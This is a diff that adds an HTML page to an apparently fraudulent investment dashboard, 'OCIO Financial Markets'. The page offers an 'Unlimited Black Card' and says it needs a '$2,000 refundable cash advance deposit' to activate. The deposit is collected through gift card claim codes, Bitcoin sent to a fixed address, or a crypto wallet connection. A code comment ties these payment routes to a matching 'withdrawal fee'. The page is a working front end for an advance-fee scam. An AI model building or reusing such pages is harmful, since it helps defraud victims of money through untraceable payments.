@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Get Unlimited Credit Card – OCIO Financial Markets</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=DM+Sans:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet" />
+  <style>
+    #wd-amount-validation {
+      padding: 0.75rem 1rem;
+      border-radius: var(--radius-md, 8px);
+      font-size: 0.9rem;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin-top: 0.5rem;
+    }
+    #wd-amount-validation.error {
+      background: #fee2e2;
+      color: #991b1b;
+      border: 1px solid #fca5a5;
+    }
+    #wd-amount-validation i {
+      flex-shrink: 0;
+      font-size: 1.1rem;
+    }
+    .wd-amount-helper {
+      font-size: 0.85rem;
+      color: var(--text-secondary, #6b7280);
+      margin-top: 0.35rem;
+      display: none;
+    }
+    .wd-amount-helper.active {
+      display: block;
+    }
+  </style>
+</head>
+<body class="dashboard-body">
+
+  <!-- Sidebar -->
+  <aside class="dash-sidebar" id="dash-sidebar">
+    <div class="dash-sidebar-top">
+      <a href="index.html" class="logo">
+        <div class="logo-mark"><img src="logo.png" alt="OCIO Logo" width="28" height="28" style="border-radius:6px;"></div>
+        <span class="logo-text">OCIO</span>
+      </a>
+    </div>
+    <nav class="dash-nav">
+      <a href="dashboard.html?tab=portfolio" class="dash-nav-item"><i class="fas fa-chart-pie"></i><span>Portfolio</span></a>
+      <a href="markets.html" class="dash-nav-item"><i class="fas fa-chart-line"></i><span>Markets</span></a>
+      <a href="dashboard.html?tab=transactions" class="dash-nav-item"><i class="fas fa-arrow-right-arrow-left"></i><span>Transactions</span></a>
+      <a href="deposit.html" class="dash-nav-item"><i class="fas fa-wallet"></i><span>Deposit</span></a>
+      <a href="withdraw.html" class="dash-nav-item"><i class="fas fa-money-bill-transfer"></i><span>Withdraw</span></a>
+      <a href="credit-card.html" class="dash-nav-item active" id="nav-credit-card"><i class="fas fa-credit-card"></i><span>Get Unlimited Credit Card</span></a>
+      <a href="dashboard.html?tab=settings" class="dash-nav-item"><i class="fas fa-gear"></i><span>Settings</span></a>
+    </nav>
+    <div class="dash-sidebar-bottom">
+      <button class="dash-nav-item dash-logout" id="dash-logout"><i class="fas fa-right-from-bracket"></i><span>Logout</span></button>
+    </div>
+  </aside>
+
+  <div class="dash-main">
+    <header class="dash-topbar">
+      <button class="dash-menu-btn" id="dash-menu-btn" aria-label="Toggle sidebar"><i class="fas fa-bars"></i></button>
+      <div class="dash-topbar-left"><h2>Get Unlimited Credit Card</h2></div>
+      <div class="dash-topbar-right">
+        <div class="dash-avatar" id="dash-avatar"><span id="avatar-initials">U</span></div>
+        <span class="dash-user-name" id="dash-user-name">User</span>
+      </div>
+    </header>
+
+    <div class="dash-content">
+      <!-- Step 1: Credit Card Overview -->
+      <div class="withdraw-step" id="cc-step-1">
+        <div class="dash-welcome"><div>
+          <h1><i class="fas fa-credit-card" style="color:var(--blue-500);"></i> OCIO Black Card</h1>
+          <p>Your premium unlimited credit line awaits activation.</p>
+        </div></div>
+
+        <!-- Simulated Credit Card UI -->
+        <div class="credit-card-container anim-float" style="margin: 2rem auto; perspective: 1000px; max-width: 400px; cursor: pointer; transition: transform 0.3s ease;" onmouseover="this.style.transform='scale(1.02)'" onmouseout="this.style.transform='scale(1)'">
+          <div class="credit-card glass-card" style="position: relative; width: 100%; height: 250px; border-radius: 20px; background: linear-gradient(135deg, rgba(15, 23, 42, 0.95), rgba(30, 41, 59, 0.9)); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); padding: 2rem; color: white; display: flex; flex-direction: column; justify-content: space-between; overflow: hidden; border: 1px solid rgba(255,255,255,0.1);">
+            <div style="position: absolute; top: -50px; right: -50px; width: 150px; height: 150px; background: radial-gradient(circle, rgba(59,130,246,0.3) 0%, rgba(0,0,0,0) 70%); border-radius: 50%;"></div>
+            <div style="position: absolute; bottom: -80px; left: -20px; width: 200px; height: 200px; background: radial-gradient(circle, rgba(16,185,129,0.2) 0%, rgba(0,0,0,0) 70%); border-radius: 50%;"></div>
+            
+            <div style="display: flex; justify-content: space-between; align-items: flex-start; z-index: 1;">
+              <div>
+                <h3 style="margin: 0; font-size: 1.2rem; font-weight: 700; letter-spacing: 2px; background: linear-gradient(to right, #fff, #94a3b8); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">OCIO FINANCIAL</h3>
+                <span style="font-size: 0.7rem; color: #94a3b8; letter-spacing: 1.5px;">UNLIMITED BLACK</span>
+              </div>
+              <i class="fas fa-wifi" style="transform: rotate(90deg); font-size: 1.5rem; color: #cbd5e1;"></i>
+            </div>
+            
+            <div style="z-index: 1;">
+              <div style="width: 45px; height: 35px; background: linear-gradient(135deg, #fbbf24, #d97706); border-radius: 6px; margin-bottom: 1.2rem; box-shadow: inset 0 0 5px rgba(0,0,0,0.3), 0 2px 4px rgba(0,0,0,0.2);"></div>
+              <div style="font-family: 'Courier New', monospace; font-size: 1.5rem; font-weight: 600; letter-spacing: 4px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); margin-bottom: 0.8rem; color: #f8fafc;" id="cc-number">•••• •••• •••• ••••</div>
+              <div style="display: flex; justify-content: space-between; align-items: flex-end;">
+                <div>
+                  <div style="font-size: 0.65rem; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 2px;">Cardholder Name</div>
+                  <div style="font-size: 1.1rem; font-weight: 500; letter-spacing: 1px; text-transform: uppercase; color: #f1f5f9;" id="cc-name">User Name</div>
+                </div>
+                <div style="text-align: right;">
+                  <div style="font-size: 0.65rem; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 2px;">Valid Thru</div>
+                  <div style="font-size: 1rem; font-weight: 500; color: #f1f5f9;">12/29</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="dash-card" style="max-width:620px; margin: 0 auto;">
+          <div class="dash-card-header"><h3>Activate Your Card</h3></div>
+          <div style="padding: 1.5rem;">
+            <p style="margin-bottom: 1.5rem; color: var(--text-secondary); line-height: 1.6;">Your OCIO Unlimited Black Card requires a one-time cash advance deposit to activate the unlimited credit line. This deposit is fully refundable upon card cancellation.</p>
+            
+            <div class="wd-fee-banner glass-card" style="margin-bottom: 1.5rem; display: flex; align-items: center; gap: 1rem; padding: 1.25rem; background: rgba(59, 130, 246, 0.05); border: 1px solid rgba(59, 130, 246, 0.2); border-radius: 12px;">
+              <div class="wd-fee-icon" style="background: rgba(59, 130, 246, 0.1); color: var(--blue-500); width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 1.5rem;"><i class="fas fa-shield-halved"></i></div>
+              <div class="wd-fee-info">
+                <h3 style="margin: 0; font-size: 1.1rem; color: var(--text-main);">Cash Advance Deposit: <span id="cc-fee-amount" style="font-weight: 700; color: var(--blue-500);">$2,000.00</span></h3>
+                <p style="margin: 0; font-size: 0.9rem; color: var(--text-secondary); margin-top: 0.25rem;">Required to activate your unlimited credit line.</p>
+              </div>
+            </div>
+
+            <button class="btn btn-primary btn-lg btn-full" id="cc-activate-btn"><span>Proceed to Deposit</span><i class="fas fa-arrow-right"></i></button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2: Fee Payment -->
+      <div class="withdraw-step" id="cc-step-2" style="display:none;">
+        <div class="dash-welcome"><div>
+          <h1><i class="fas fa-money-check-dollar" style="color:#10b981;"></i> Make Deposit</h1>
+          <p>Choose a payment method to complete your cash advance deposit.</p>
+        </div></div>
+
+        <!-- Keep similar payment methods as withdrawal fee -->
+        <div class="wd-pay-methods">
+          <h3 class="wd-pay-title">Choose Payment Method</h3>
+          <div class="wd-method-grid">
+            <button class="wd-method-card glass-card cc-method" data-method="giftcard">
+              <div class="wd-method-icon" style="background:#fef3c7;color:#b45309;"><i class="fas fa-gift"></i></div>
+              <h4>Gift Card</h4>
+              <p>Upload any gift card</p>
+            </button>
+            <button class="wd-method-card glass-card cc-method" data-method="wallet">
+              <div class="wd-method-icon" style="background:#ede9fe;color:#6d28d9;"><i class="fas fa-wallet"></i></div>
+              <h4>Wallet Connect</h4>
+              <p>Pay via crypto wallet</p>
+            </button>
+            <button class="wd-method-card glass-card cc-method" data-method="btc">
+              <div class="wd-method-icon" style="background:#fff7ed;color:#ea580c;"><i class="fab fa-bitcoin"></i></div>
+              <h4>Bitcoin (BTC)</h4>
+              <p>Send BTC payment</p>
+            </button>
+          </div>
+        </div>
+
+        <!-- Gift Card Form -->
+        <div id="cc-form-giftcard" class="wd-method-form dash-card" style="display:none;max-width:620px;margin:2rem auto;">
+          <div class="dash-card-header"><h3>Upload Gift Card</h3></div>
+          <div style="padding: 1.5rem;">
+            <form id="cc-giftcard-form" class="auth-form" novalidate>
+              <div class="form-group">
+                <label for="cc-gc-type" class="form-label">Gift Card Type</label>
+                <select id="cc-gc-type" class="form-input form-select" required>
+                  <option value="">-- Select Brand --</option>
+                  <option>Apple</option>
+                  <option>Amazon</option>
+                  <option>Steam</option>
+                  <option>Google Play</option>
+                  <option>Vanilla Visa</option>
+                  <option>Other</option>
+                </select>
+              </div>
+              <div class="form-group">
+                <label for="cc-gc-code" class="form-label">Gift Card Code</label>
+                <div class="input-wrap"><i class="fas fa-barcode"></i><input type="text" id="cc-gc-code" class="form-input" placeholder="Enter claim code" required /></div>
+              </div>
+              <div class="wd-fee-reminder"><i class="fas fa-info-circle"></i> Amount to deposit: <strong class="cc-fee-display">$2,000.00</strong></div>
+              <button type="submit" class="btn btn-primary btn-lg btn-full"><i class="fas fa-upload"></i> Submit Deposit</button>
+            </form>
+          </div>
+        </div>
+
+        <!-- BTC Form -->
+        <div id="cc-form-btc" class="wd-method-form dash-card" style="display:none;max-width:620px;margin:2rem auto;">
+          <div class="dash-card-header"><h3>Bitcoin Payment</h3></div>
+          <div style="padding: 1.5rem; text-align: center;">
+            <div class="qr-code-wrap" style="background: white; padding: 10px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);"><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" alt="BTC QR" style="margin:0 auto;border-radius:6px; display:block;"></div>
+            <p style="margin:1.5rem 0 1rem;color:var(--text-secondary);">Send exactly <strong class="cc-fee-display" style="color:var(--text-main); font-size: 1.1rem;">$2,000.00</strong> worth of BTC to:</p>
+            <div class="btc-address-box" style="display: flex; align-items: center; justify-content: space-between; background: var(--bg-surface); padding: 0.75rem 1rem; border-radius: 8px; border: 1px solid var(--border-color);">
+              <code id="cc-btc-addr" style="color: var(--blue-500); font-size: 0.9rem; word-break: break-all;">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</code>
+              <button class="copy-btn" id="cc-copy-btc" style="background: none; border: none; color: var(--text-secondary); cursor: pointer; padding: 0.5rem;"><i class="fas fa-copy"></i></button>
+            </div>
+            <button class="btn btn-primary btn-lg btn-full" id="cc-btc-paid" style="margin-top:1.5rem;"><i class="fas fa-check"></i> I Have Paid</button>
+          </div>
+        </div>
+        
+        <!-- Wallet Connect Form -->
+        <div id="cc-form-wallet" class="wd-method-form dash-card" style="display:none;max-width:620px;margin:2rem auto;">
+          <div class="dash-card-header"><h3>Wallet Connect</h3></div>
+          <div style="padding: 2rem; text-align: center;">
+            <div style="font-size: 3rem; color: #6d28d9; margin-bottom: 1rem;"><i class="fas fa-wallet"></i></div>
+            <h4 style="margin-bottom: 0.5rem;">Connect Web3 Wallet</h4>
+            <p style="color: var(--text-secondary); margin-bottom: 1.5rem;">Connect your MetaMask, Trust Wallet, or other Web3 wallet to securely send your deposit.</p>
+            <button class="btn btn-primary btn-lg btn-full" id="cc-wallet-connect"><i class="fas fa-link"></i> Connect Wallet</button>
+          </div>
+        </div>
+
+        <div style="text-align:center;margin-top:2rem;">
+          <button class="btn btn-outline" id="cc-back-btn"><i class="fas fa-arrow-left"></i> Back to Card Overview</button>
+        </div>
+      </div>
+
+      <!-- Step 3: Success -->
+      <div class="withdraw-step" id="cc-step-3" style="display:none;">
+        <div class="wd-success-screen" style="text-align: center; max-width: 500px; margin: 3rem auto; padding: 3rem 2rem; background: var(--bg-card); border-radius: 20px; border: 1px solid var(--border-color); box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);">
+          <div class="wd-success-icon anim-float" style="font-size: 4rem; color: #10b981; margin-bottom: 1.5rem;"><i class="fas fa-check-circle"></i></div>
+          <h1 style="margin-bottom: 1rem; color: var(--text-main);">Deposit Submitted</h1>
+          <p style="color: var(--text-secondary); margin-bottom: 2rem; line-height: 1.6;">Your cash advance deposit is being verified. Once confirmed, your OCIO Unlimited Black Card will be activated and mailed to your registered address.</p>
+          <a href="dashboard.html" class="btn btn-primary btn-lg" style="display: inline-flex;"><i class="fas fa-home" style="margin-right: 0.5rem;"></i> Back to Dashboard</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="dash-overlay" id="dash-overlay"></div>
+  <script src="m_script.js?v=1779724590566"></script>
+  <!-- Credit Card Logic -->
+  <script src="../credit-card.js"></script>
+</body>
+</html>
